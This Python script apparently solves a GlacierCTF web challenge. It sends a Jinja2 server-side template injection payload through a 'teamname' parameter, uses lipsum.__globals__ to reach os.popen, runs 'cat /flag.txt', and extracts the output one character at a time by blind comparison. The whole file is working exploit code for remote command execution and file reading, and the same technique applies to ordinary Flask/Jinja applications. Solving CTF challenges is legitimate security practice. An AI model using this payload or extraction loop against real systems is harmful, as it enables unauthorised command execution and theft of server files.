import requests

url = "https://teamcheck.web.glacierctf.com"
endpoint = url + "/check_team"

alphabet = "abcdefghijklmnopqrstuvwxyz0123456789}"
prefix = "gctf{"
flag = prefix

for i in range(len(prefix),80):
     for char in alphabet:
        candidate = flag + char
        payload=("{% if lipsum.__globals__.__builtins__.__import__(\'os\').popen(\"cat /flag.txt\").read()[0:"
        + str(i + 1) + "] == " + repr(candidate)
        + " %}MATCH{% else %}NO{% endif %}")

        response = requests.get(endpoint,params={"teamname": payload},timeout=10)
        if "MATCH" in response.text:
            flag += char
            print (flag)        

            if char =="}":
                break
